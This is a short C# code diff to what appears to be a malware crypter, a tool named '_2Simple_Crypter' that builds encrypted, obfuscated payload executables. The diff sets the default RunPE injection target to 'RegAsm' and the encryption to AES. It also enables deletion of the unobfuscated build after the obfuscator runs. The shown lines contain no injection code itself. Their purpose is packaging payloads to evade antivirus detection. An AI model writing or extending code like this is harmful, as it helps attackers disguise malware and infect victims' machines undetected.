@@ -29,6 +29,8 @@ namespace _2Simple_Crypter
         {
             InitializeComponent();
             SetupFoldername();
+            runpeTypeBox.Text = "RegAsm";
+            encryptionTypeBox.Text = "AES";
         }
 
         #region Panels
@@ -100,7 +102,7 @@ namespace _2Simple_Crypter
         }
         // Build payload 
         private void buildBtn_Click(object sender, EventArgs e)
-        {
+        {            
             using (SaveFileDialog selectSaveDialog = new SaveFileDialog())
             {
                 selectSaveDialog.Filter = "Executable files|*.exe";
@@ -129,12 +131,15 @@ namespace _2Simple_Crypter
                     }
 
                     settings.buildDirectory = selectSaveDialog.FileName;
+                                      
                     this.Build();
 
                     CallObfuscator(selectSaveDialog);
                     GC.Collect();
                     GC.WaitForPendingFinalizers();
-                    //File.Delete(selectSaveDialog.FileName);
+                    File.Delete(selectSaveDialog.FileName);
+                    
+
                 }
             }
         }
